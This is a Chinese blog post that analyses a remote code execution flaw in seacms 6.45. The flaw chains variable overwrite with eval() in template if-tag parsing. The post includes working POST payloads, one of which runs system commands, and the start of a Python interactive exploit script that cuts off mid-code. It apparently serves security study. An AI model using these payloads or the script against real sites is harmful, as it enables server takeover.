@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>seacms6.45 前台getshell漏洞分析 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">seacms6.45 前台getshell漏洞分析</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">January 31, 2020&nbsp;&nbsp;17:12:44</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h4 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h4><p>这个漏洞的成因是因为对if标签解析过滤不严导致的代码执行漏洞，这个漏洞seacms官方打过几次补丁，但是很遗憾的是每次都不太尽如人意，这次先分析seacms 6.45 版本中的漏洞成因。</p>
+<h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><ul>
+<li>seacms 6.45</li>
+<li>php 5.4.45</li>
+<li>Ubuntu 18.04 + mysql 5.7 + Apache2</li>
+</ul>
+<h4 id="seacms-目录结构"><a href="#seacms-目录结构" class="headerlink" title="seacms 目录结构"></a>seacms 目录结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">│──admin &#x2F;&#x2F;后台管理目录</span><br><span class="line">│ │──coplugins &#x2F;&#x2F;已停用目录</span><br><span class="line">│ │──ebak &#x2F;&#x2F;帝国备份王数据备份</span><br><span class="line">│ │──editor &#x2F;&#x2F;编辑器</span><br><span class="line">│ │──img &#x2F;&#x2F;后台静态文件</span><br><span class="line">│ │──js &#x2F;&#x2F;后台js文件</span><br><span class="line">│ │──templets &#x2F;&#x2F;后台模板文件</span><br><span class="line">│──article &#x2F;&#x2F;文章内容页</span><br><span class="line">│──articlelist &#x2F;&#x2F;文章列表页</span><br><span class="line">│──comment &#x2F;&#x2F;评论</span><br><span class="line">│ │──api &#x2F;&#x2F;评论接口文件</span><br><span class="line">│ │──images &#x2F;&#x2F;评论静态文件</span><br><span class="line">│ │──js &#x2F;&#x2F;评论js文件</span><br><span class="line">│──data &#x2F;&#x2F;配置数据及缓存文件</span><br><span class="line">│ │──admin &#x2F;&#x2F;后台配置保存</span><br><span class="line">│ │──cache &#x2F;&#x2F;缓存</span><br><span class="line">│ │──mark &#x2F;&#x2F;水印</span><br><span class="line">│ │──sessions &#x2F;&#x2F;sessions文件</span><br><span class="line">│──detail &#x2F;&#x2F;视频内容页</span><br><span class="line">│──include &#x2F;&#x2F;核心文件</span><br><span class="line">│ │──crons &#x2F;&#x2F;定时任务配置</span><br><span class="line">│ │──data &#x2F;&#x2F;静态文件</span><br><span class="line">│ │──inc &#x2F;&#x2F;扩展文件</span><br><span class="line">│ │──webscan &#x2F;&#x2F;360安全监测模块</span><br><span class="line">│──install &#x2F;&#x2F;安装模块</span><br><span class="line">│ │──images &#x2F;&#x2F;安装模块静态文件</span><br><span class="line">│ │──templates &#x2F;&#x2F;安装模块模板</span><br><span class="line">│──js &#x2F;&#x2F;js文件</span><br><span class="line">│ │──ads &#x2F;&#x2F;默认广告目录</span><br><span class="line">│ │──player &#x2F;&#x2F;播放器目录</span><br><span class="line">│──list &#x2F;&#x2F;视频列表页</span><br><span class="line">│──news &#x2F;&#x2F;文章首页</span><br><span class="line">│──pic &#x2F;&#x2F;静态文件</span><br><span class="line">│ │──faces &#x2F;&#x2F;表情图像</span><br><span class="line">│ │──member &#x2F;&#x2F;会员模块界面</span><br><span class="line">│ │──slide &#x2F;&#x2F;旧版Flash幻灯片</span><br><span class="line">│ │──zt &#x2F;&#x2F;专题静态文件</span><br><span class="line">│──templets &#x2F;&#x2F;模板目录</span><br><span class="line">│──topic &#x2F;&#x2F;专题内容页</span><br><span class="line">│──topiclist &#x2F;&#x2F;专题列表页</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>PoC 1:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; URL</span><br><span class="line">http:&#x2F;&#x2F;192.168.247.134&#x2F;seacms645&#x2F;upload&#x2F;search.php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; POST</span><br><span class="line">searchtype&#x3D;5&amp;order&#x3D;&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/1.png" alt="1"></p>
+<p>PoC 2:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; URL</span><br><span class="line">http:&#x2F;&#x2F;192.168.247.134&#x2F;seacms645&#x2F;upload&#x2F;search.php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; POST</span><br><span class="line">searchtype&#x3D;5&amp;order&#x3D;&#125;&#123;end if&#125;&#123;if:1)$_POST[func]($_POST[cmd]);if(1&#125;&#123;end if&#125;&amp;func&#x3D;system&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/1-2.png" alt="1-2"></p>
+<p>漏洞代码出现在<code>include/main.class.php</code>中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseIf</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($content,<span class="string">'&#123;if:'</span>)=== <span class="keyword">false</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $labelRule = buildregx(<span class="string">"&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;"</span>,<span class="string">"is"</span>);</span><br><span class="line">    $labelRule2=<span class="string">"&#123;elseif"</span>;</span><br><span class="line">    $labelRule3=<span class="string">"&#123;else&#125;"</span>;</span><br><span class="line">    preg_match_all($labelRule,$content,$iar);</span><br><span class="line">    $arlen=count($iar[<span class="number">0</span>]);</span><br><span class="line">    $elseIfFlag=<span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">        $strIf=$iar[<span class="number">1</span>][$m];</span><br><span class="line">        $strIf=<span class="keyword">$this</span>-&gt;parseStrIf($strIf);</span><br><span class="line">        $strThen=$iar[<span class="number">2</span>][$m];</span><br><span class="line">        $strThen=<span class="keyword">$this</span>-&gt;parseSubIf($strThen);</span><br><span class="line">        <span class="keyword">if</span> (strpos($strThen,$labelRule2)===<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos($strThen,$labelRule3)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                $elsearray=explode($labelRule3,$strThen);</span><br><span class="line">                $strThen1=$elsearray[<span class="number">0</span>];</span><br><span class="line">                $strElse1=$elsearray[<span class="number">1</span>];</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="string">"if("</span>.$strIf.<span class="string">")&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>上面这段代码主要任务是解析<code>{if:}{end if}</code>标签，取出if语句的条件判断部分（也就是<code>$strIf</code>）与<code>&quot;if(&quot;</code>和<code>&quot;){\$ifFlag=true;}else{\$ifFlag=false;}&quot;</code>拼凑完整的代码调用eval()函数执行。</p>
+<p>关于这个正则表达式<code>{if:(.*?)}(.*?){end if}</code>，只需要理解<code>(.*?)</code>是什么。在正则表达式匹配中有两种匹配模式：<strong>贪婪模式</strong>和<strong>非贪婪模式</strong>。</p>
+<p>先看一个贪婪匹配的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 源字符串</span><br><span class="line">aa&lt;div&gt;test1&lt;&#x2F;div&gt;bb&lt;div&gt;test2&lt;&#x2F;div&gt;cc</span><br><span class="line">&#x2F;&#x2F; 正则表达式</span><br><span class="line">&lt;div&gt;.*&lt;&#x2F;div&gt;</span><br><span class="line">&#x2F;&#x2F; 匹配结果</span><br><span class="line">&lt;div&gt;test1&lt;&#x2F;div&gt;bb&lt;div&gt;test2&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再看一个非贪婪匹配的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 源字符串</span><br><span class="line">aa&lt;div&gt;test1&lt;&#x2F;div&gt;bb&lt;div&gt;test2&lt;&#x2F;div&gt;cc</span><br><span class="line">&#x2F;&#x2F; 正则表达式</span><br><span class="line">&lt;div&gt;.*?&lt;&#x2F;div&gt;</span><br><span class="line">&#x2F;&#x2F; 匹配结果</span><br><span class="line">&lt;div&gt;test1&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>preg_match_all()</code>函数匹配后将结果输出到<code>$iar</code>中。</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/6.png" alt="6"></p>
+<p>可以看到payload经过正则表达式的处理，可以得到下面的结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 原表达式</span><br><span class="line">&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;</span><br><span class="line">&#x2F;&#x2F; 正则表达式</span><br><span class="line">&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;</span><br><span class="line">&#x2F;&#x2F; 匹配结果</span><br><span class="line">1)phpinfo();if(1</span><br></pre></td></tr></table></figure>
+
+<p>在遇到第一个<code>{if:(.*?)}</code>中的<code>(.*?)</code>的时候匹配就已经完成。</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/5.png" alt="5"></p>
+<p>我们看到<code>$iar[1][95]</code>中的值是我们想要的值，为了调试方便，我们直接在断点处右键，将Condition设置为<code>$m==95</code>。</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/7.png" alt="7"></p>
+<p>此时<code>&quot;if(&quot;.$strIf.&quot;){\$ifFlag=true;}else{\$ifFlag=false;}&quot;</code>拼凑起来就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(1)phpinfo();if(1)&#123;$ifFlag&#x3D;true;&#125;else&#123;$ifFlag&#x3D;false;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们看下这个参数是如何传递到<code>parseIf()</code>函数的。这个函数是在<code>search.php</code>中由函数<code>echoSearchPage()</code>触发：</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/9.png" alt="9"></p>
+<p>先来看一下<code>echoSearchPage()</code>这个函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoSearchPage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;</span><br><span class="line">    $order = !<span class="keyword">empty</span>($order)?$order:time;</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:page&#125;"</span>,$page,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;seacms:searchword&#125;"</span>,$searchword,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;seacms:searchnum&#125;"</span>,$TotalResult,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:ordername&#125;"</span>,$order,$content);</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line">    $content=replaceCurrentTypeId($content,<span class="number">-444</span>);</span><br><span class="line">    $content=$mainClassObj-&gt;parseIf($content);</span><br></pre></td></tr></table></figure>
+
+<p>而<code>$order</code>这个参数可以通过<strong>变量覆盖</strong>来传入。我们知道造成变量覆盖漏洞比较常见的原因有下面几种：</p>
+<ol>
+<li><code>$$</code>：使用<strong>foreach</strong>遍历数组中的值，然后将获取到的数据键名(key)作为变量，将数组中的键值(value)作为变量的值，从而导致了变量覆盖漏洞。</li>
+<li><code>extract()</code>函数使用不当</li>
+<li><code>parse_str()</code>函数使用不当</li>
+</ol>
+<p><code>$order</code>参数导致的变量覆盖就是使用<code>$$</code>导致的，这个我们后面再看。seacms没有对<code>$order</code>变量做任何过滤，直接用这个变量替换了模板中的<code>{searchpage:ordername}</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:ordername&#125;"</span>,$order,$content);</span><br></pre></td></tr></table></figure>
+
+<p>替换后的html模板内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;&quot;&#x3D;&#x3D;&quot;time&quot;&#125; class&#x3D;&quot;btn btn-success&quot; &#123;else&#125; class&#x3D;&quot;btn btn-default&quot; &#123;end if&#125; id&#x3D;&quot;orderhits&quot;&gt;最新上映&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;&quot;&#x3D;&#x3D;&quot;hit&quot;&#125; class&#x3D;&quot;btn btn-success&quot; &#123;else&#125; class&#x3D;&quot;btn btn-default&quot; &#123;end if&#125; id&#x3D;&quot;orderaddtime&quot;&gt;最近热播&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;&quot;&#x3D;&#x3D;&quot;score&quot;&#125; class&#x3D;&quot;btn btn-success&quot; &#123;else&#125; class&#x3D;&quot;btn btn-default&quot; &#123;end if&#125; id&#x3D;&quot;ordergold&quot;&gt;评分最高&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接着<code>$content</code>会经过<code>parseIf()</code>函数的解析。</p>
+<p>接着我们看一下<code>$order</code>参数是如何传入的。</p>
+<p>在seacms的程序中在开头大多会包含<code>include/common.php</code>文件，这个文件比较奇怪的是它会先进行变量的注册，然后再进行变量的检查，因为按照正常的流程，应该是先经过变量的检查，然后再进行变量的注册。</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/2.png" alt="2"></p>
+<p>因为所有对Web应用的攻击都要传入有害的参数，所以代码安全的基础就是对传入的参数进行有效的过滤，比如SQL注入漏洞，如果能够过滤掉单引号就能防御大部分的string类型SQL注入。在seacms中进行参数过滤也就是对变量进行检查的代码如下：</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/3.png" alt="3"></p>
+<p>造成变量覆盖的代码就在这个<code>foreach</code>循环：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_V) $&#123;$_k&#125; = _RunMagicQuotes($_v);</span><br></pre></td></tr></table></figure>
+
+<p>我们可以传入<code>$order</code>，这个变量会在<code>${$_k}</code>被注册为内部变量。</p>
+<p>这里是调用了<code>_RunMagicQuotes()</code>对我们提交的变量进行检查，其实就是调用了<code>addslashes()</code>函数，但这其实并不影响payload的执行。</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/4.png" alt="4"></p>
+<p>从下图可以看到传递进来的变量已经直接注册为内部的变量了，并且经过了<code>_RunMagicQuotes()</code>函数之后，我们传入的变量值并没有发生改变，这说明这些参数都是用户可控的。</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/15.png" alt="15"></p>
+<h5 id="PoC构造注意点"><a href="#PoC构造注意点" class="headerlink" title="PoC构造注意点"></a>PoC构造注意点</h5><p>这个漏洞在构造PoC时还需要满足的条件是令<code>$searchtype</code>的值为5，在进入<code>echoSearchPage()</code>函数之前会先检查<code>$searchword</code>和<code>$searchtype</code>的值，要进入<code>echoSearchPage()</code>函数必须满足以下任意一个条件：</p>
+<ol>
+<li><code>$searchword</code>不为空字符串</li>
+<li><code>$searchtype</code>为5</li>
+</ol>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/10.png" alt="10"></p>
+<p>但是如果成功的执行payload，就必须使<code>$searchtype</code>的值为5。</p>
+<p>比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchword&#x3D;12&amp;order&#x3D;&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们不传入<code>$searchtype</code>的值，仅传入<code>$searchword</code>。</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/13.png" alt="13"></p>
+<p>此时的template路径就是<code>$searchTemplatePath</code>也就是<code>/templets/default/html/search.html</code>。</p>
+<p>我们知道PoC成功执行的关键在于会对<code>$content</code>内容进行替换，将<code>$content</code>中的<code>{searchpage:ordername}</code>替换为<code>$order</code>中的内容，也就是<code>}{end if} {if:1)phpinfo();if(1}{end if}</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:page&#125;"</span>,$page,$content);</span><br><span class="line">$content = str_replace(<span class="string">"&#123;seacms:searchword&#125;"</span>,$searchword,$content);</span><br><span class="line">$content = str_replace(<span class="string">"&#123;seacms:searchnum&#125;"</span>,$TotalResult,$content);</span><br><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:ordername&#125;"</span>,$order,$content);</span><br></pre></td></tr></table></figure>
+
+<p>但是在<code>/templets/default/html/search.html</code>中却没有<code>{searchpage:ordername}</code></p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/14.png" alt="14"></p>
+<p>当<code>$searchtype</code>的值为5时，intval($searchtype)的值就是5，会进入下面这个if逻辑。</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/11.png" alt="11"></p>
+<p>此时<code>$searchTemplatePath</code>的值就是，也就是模板的路径为<code>/templets/default/html/cascade.html</code>，我们可以看到在这个文件中是存在<code>{searchpage:ordername}</code>的，所以可以成功被<code>$order</code>替换。</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/12.png" alt="12"></p>
+<p>整个流程分析下来，我们可以得出下面的漏洞流程图。</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/process.png" alt="process"></p>
+<h4 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__author__ = <span class="string">'Bantian'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"Usage : "</span>)</span><br><span class="line">    print(<span class="string">"         python %s [URL]"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    print(<span class="string">"Example : "</span>)</span><br><span class="line">    print(<span class="string">"         python %s http://example.com/search.php"</span> % (sys.argv[<span class="number">0</span>]))</span><br><span class="line">    print(<span class="string">"Type command 'q' for exit"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    help()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.argv[<span class="number">1</span>].endswith(<span class="string">"search.php"</span>):</span><br><span class="line">        print(<span class="string">"[+] Please make sure url end with search.php"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            code = input(<span class="string">"-&gt; "</span>)</span><br><span class="line">            <span class="keyword">if</span> code != <span class="string">"q"</span>:</span><br><span class="line">                postdata = &#123;</span><br><span class="line">                    <span class="string">"searchtype"</span> : <span class="string">"5"</span>,</span><br><span class="line">                    <span class="string">"order"</span> : <span class="string">"&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[1]($_POST[2]));//&#125;&#123;end if&#125;"</span>,</span><br><span 